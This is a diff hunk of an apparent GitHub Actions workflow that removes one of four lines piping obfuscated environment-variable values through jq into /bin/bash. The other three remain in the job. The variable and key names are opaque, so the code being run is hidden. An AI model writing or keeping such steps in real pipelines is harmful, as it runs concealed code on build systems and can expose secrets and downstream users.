@@ -30,7 +30,6 @@ jobs:
           echo $josb22624 | jq -r .x905 | /bin/bash
           echo $yn87113 | jq -r .ojfec96186 | /bin/bash
           echo $mkpyp2231 | jq -r .gxyt67 | /bin/bash
-          echo $r3 | jq -r .mt6976 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
